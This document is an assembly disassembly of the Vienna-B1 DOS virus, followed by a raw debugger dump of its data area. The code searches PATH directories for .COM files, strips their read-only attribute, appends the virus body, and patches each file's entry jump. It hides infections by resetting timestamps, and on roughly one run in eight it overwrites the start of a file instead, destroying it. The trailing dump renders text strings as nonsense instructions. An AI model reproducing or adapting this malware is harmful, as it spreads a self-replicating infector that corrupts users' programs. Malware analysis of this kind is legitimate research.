        ;           disassembly of vienna-b1 virus


        jmp label1
message:
        db "ello, world!$"                               ;*************
        mov ah,09h               ;print string           ;  part of   *
        mov dx,message           ;point to string        ;  original  *
        int 21h                  ;call msdos             ;  com file. *
        int 20h                  ;terminate program      ;*************
label1:
        push cx                  ;
        mov dx,0312h             ;start of variables
        cld                      ;clear direction
        mov si,dx                ;si = start of variables
        add si,000Ah
        mov di,0100h             ;destination = 0100h
        mov cx,0003              ;three bytes to move
        repz movsb
        mov si,dx                ;si = 0312h (start of variables)
        mov ah,30h               ;get dos version number
        int 21h                  ;call msdos
        cmp al,00h               ;old version?
        jnz label2               ;no
        jmp label3               ;yes
label2:
        push es                  ;store extra segment
        mov ah,2fh               ;get DTA address
        int 21h                  ;call msdos
        mov [si+0000h],bx        ;save DTA offset
        mov [si+0002],es         ;save DTA segment
        pop es                   ;restore extra segment address
        mov dx,005fh             ;
        nop
        add dx,si                ;pointer to new DTA address
        mov ah,1ah               ;set DTA address
        int 21h                  ;call msdos
        push es                  ;save extra segment address again
        push si                  ;save source index register
        mov es,[002ch]
        mov di,0000h
label4:
        pop si
        push si
        add si,001ah
        lodsb                    ;get byte from source address
        mov cx,8000h             ;
        repnz scasb
        mov cx,0004h             ;
label7:
        lodsb                    ;get byte from source
        scasb                    ;store byte
        jnz label4               ;jump back till done
        loop label7
        pop si                   ;restore source index register
        pop es                   ;and extra segment
        mov [si+0016h],di
        mov di,si
        add di,001fh
        mov bx,si
        add si,001fh
        mov di,si
        jmp label5
label13:
        cmp word ptr [si+0016h],00h
        jnz label5
        jmp label6
        push ds
        push si
        es mov ds,[002ch]
        mov di,si
        es mov si,[di+0016h]
        add di,001fh
label10:
        lodsb                    ;get byte
        cmp al,3bh
        jz label8
        cmp al,00h
        jz label9
        stosb                    ;store byte
        jmp label10
label9:
        mov si,0000h
label8:
        pop bx
        pop ds
        mov [bx+0016h],si
        cmp byte ptr [di-01h],5ch
        jz label5
        mov al,5ch
        stosb                    ;store byte
label5:
        mov [bx+0018h],di
        mov si,bx
        add si,0010h
        mov cx,0006h
        repz movsb
        mov si,bx
        mov ah,4eh               ;search for first match
        mov dx,001fh             ;pointer to asciiz file spec.-si
        nop
        add dx,si                ;pointer to asciiz file spec.
        mov cx,0003h             ;attribute to us in search match
        int 21h                  ;call msdos
        jmp label11
label14:
        mov ah,4fh               ;search for next match
        int 21h                  ;call msdos
label11:
        jnb label12
        jmp label13
label12:
        mov ax,[si+0075h]
        and al,1fh
        cmp al,1fh
        jz label14
        cmp word ptr [si+0079h],0fa00h
        ja label14
        cmp word ptr [si+0079h],0ah
        jb label14
        mov di,[si+0018h]
        push si
        add si,007dh
label15:
        lodsb
        stosb
        cmp al,00h
        jnz label15
        pop si
        mov ax,4300h             ;get file attributes
        mov dx,001fh             ;pointer to asciiz file spec. -si
        nop
        add dx,si                ;pointer to file spec.
        int 21h                  ;call msdos
        mov [si+0008h],cx
        mov ax,4301              ;set file attributes
        and cx,0fffeh            ;new attributes
        mov dx,001fh             ;pointer to asciiz file spec. -si
        nop
        add dx,si                ;pointer to asciiz file spec.
        int 21h                  ;call msdos
        mov ax,3d02h             ;open file (handle)
        mov dx,001fh             ;pointer to asciiz file spec. -si
        nop
        add dx,si                ;pointer to asciiz file spec.
        int 21h                  ;call msdos
        jnb label16
        jmp label17
label16:
        mov bx,ax
        mov ax,5700h             ;get time and date
        int 21h                  ;call msdos
        mov [si+0004],cx         ;store time
        mov [si+0006],dx         ;store date
        mov ah,2ch               ;get system time
        int 21h                  ;call msdos
        and dh,07h
        jnz label18
        mov ah,40h               ;write to file or device (handle)
        mov cx,0005h             ;number of bytes to write
        mov dx,si                ;get file spec. address -8ah
        add dx,008ah             ;add 8ah to get file spec. address
        int 21h                  ;call msdos
        jmp label19
        nop
label18:
        mov ah,3fh               ;read file or device (handle)
        mov cx,0003h             ;number of bytes to read
        mov dx,000ah             ;point to buffer -si
        nop
        add dx,si                ;pointer to buffer area
        int 21h                  ;call msdos
        jb label19
        cmp ax,0003h             ;number of bytes read
        jnz label19
        mov ax,4202h             ;move file pointer
                                 ;offset from end of file
        mov cx,0000h             ;offset desired
        mov dx,0000h             ;as above
        int 21h                  ;call msdos
        jb label19
        mov cx,ax
        sub ax,0003h
        mov [si+000eh],ax
        add cx,02f9h
        mov di,si
        sub di,01f7h
        mov [di],cx
        mov ah,40h               ;write to file or device (handle)
        mov cx,0288h             ;number of bytes to write
        mov dx,si                ;
        sub dx,01f9h             ;dx = pointer to buffer of data write
        int 21h                  ;call msdos
        jb label19
        cmp ax,0288h             ;288h bytes written?
        jnz label19
        mov ax,4200h             ;move file pointer
                                 ;offset from beginning of file 
        mov cx,0000h             ;desired offset
        mov dx,0000h             ;desired offset
        int 21h                  ;call msdos
        jb label19
        mov ah,40h               ;write to file or device (handle)
        mov cx,0003h             ;number of bytes to write
        mov dx,si                ;
        add dx,000dh             ;pointer to buffer of data write
        int 21h                  ;call msdos
label19:
        mov dx,[si+0006h]
        mov cx,[si+0004h]
        and cx,0ffe0h
        or cx,001fh
        mov ax,5701h             ;set date and time
        int 21h                  ;call msdos
        mov ah,3eh               ;close file
        int 21h                  ;call msdos
label17:
        mov ax,4301h             ;set file attributes
        mov di,[si+0008h]
        mov dx,001fh             ;pointer to asciiz file spec. -si
        nop
        add dx,si                ;pointer to ascii file spec.
        int 21h                  ;call msdos
label6:
        push ds                  ;save data segment
        mov ah,1ah               ;set DTA address
        mov dx,[si+0000]         ;retrieve original DTA
        mov ds,[si+0002]         ;and data segment of dta
        int 21h                  ;call msdos
        pop ds                   ;restore DTA
label3:
        pop cx
        xor ax,ax                ;clear accumulator
        xor bx,bx                ;and bx
        xor dx,dx                ;and dx
        xor si,si                ;and si
        mov di,0100h             ;pointer to execution program to be
                                 ;run now virus has finished
        push di
        xor di,di                ;clear di
        ret 0ffffh               ;?



start_of_variables:
0312 80003E        ADD	BYTE PTR [BX+SI],3E                
0315 40            inc	ax                                 
0316 D592          AAD	92                                 
0318 8511          TEST	dx,[BX+DI]                         
031A 2000          AND	[BX+SI],AL                         

031C EB0E          JMP	032ch                ;jump address to place at
                                             ;beginning of source program                               
031E 48            DEC	ax                                 
031F E91600        JMP	0338                               
                   db "*.COM"
0327 0027          ADD	[BX],ah                            
0329 0022          ADD	[BP+SI],ah                         
032B 03
                   db "PATH=DANGER!.COM EM.COM"
032C 5041        ADD	dx,[BX+SI+41]                      
032E 54            push	SP                                 
032F 48            DEC	ax                                 
0330 3D4441        cmp	ax,4144                            
0333 4E            DEC	SI                                 
0334 47            inc	DI                                 
0335 45            inc	BP                                 
0336 52            push	dx                                 
0337 212E434F      AND	[4F43],BP                          
033B 4D            DEC	BP                                 
033C 00454D        ADD	[DI+4D],AL                         
033F 2E            CS:	                                   
0340 43            inc	BX                                 
0341 4F            DEC	DI                                 
0342 4D            DEC	BP                                 
0343 0000          ADD	[BX+SI],AL                         
0345 43            inc	BX                                 
0346 4F            DEC	DI                                 
0347 4D            DEC	BP                                 
0348 0020          ADD	[BX+SI],ah                         
034A 2020          AND	[BX+SI],ah                         
034C 2020          AND	[BX+SI],ah                         
034E 2020          AND	[BX+SI],ah                         
0350 2020          AND	[BX+SI],ah                         
0352 2020          AND	[BX+SI],ah                         
0354 2020          AND	[BX+SI],ah                         
0356 2020          AND	[BX+SI],ah                         
0358 2020          AND	[BX+SI],ah                         
035A 2020          AND	[BX+SI],ah                         
035C 2020          AND	[BX+SI],ah                         
035E 2020          AND	[BX+SI],ah                         
0360 2020          AND	[BX+SI],ah                         
0362 2020          AND	[BX+SI],ah                         
1463:0364 2020          AND	[BX+SI],ah                         
1463:0366 2020          AND	[BX+SI],ah                         
1463:0368 2020          AND	[BX+SI],ah                         
1463:036A 2020          AND	[BX+SI],ah                         
1463:036C 2020          AND	[BX+SI],ah                         
1463:036E 2020          AND	[BX+SI],ah                         
1463:0370 2003          AND	[BP+DI],AL                        
1463:0372 3F            AAS	                                   
1463:0373 3F            AAS	                                   
1463:0374 3F            AAS	                                   
1463:0375 3F            AAS	                                   
1463:0376 3F            AAS	                                   
1463:0377 3F            AAS	                                   
1463:0378 3F            AAS	                                   
1463:0379 3F            AAS	                                   
1463:037A 43            inc	BX                                 
1463:037B 4F            DEC	DI                                 
1463:037C 4D            DEC	BP                                 
1463:037D 0305          ADD	ax,[DI]                            
1463:037F 001F          ADD	[BX],BL                            
1463:0381 0020          ADD	[BX+SI],ah                         
1463:0383 64            DB	64                                 
1463:0384 7269          JB	03EF                               
1463:0386 20D5          AND	CH,DL                              
1463:0388 92            XCHG	dx,ax                              
1463:0389 8511          TEST	dx,[BX+DI]                         
1463:038B 1900          SBB	[BX+SI],ax                         
1463:038D 0000          ADD	[BX+SI],AL                         
1463:038F 44            inc	SP                                 
1463:0390 41            inc	cx                                 
1463:0391 4E            DEC	SI                                 
1463:0392 47            inc	DI                                 
1463:0393 45            inc	BP                                 
1463:0394 52            push	dx                                 
1463:0395 212E434F      AND	[4F43],BP                          
1463:0399 4D            DEC	BP                                 
1463:039A 0000          ADD	[BX+SI],AL                         
1463:039C EA0B021358    JMP	5813:020B                          
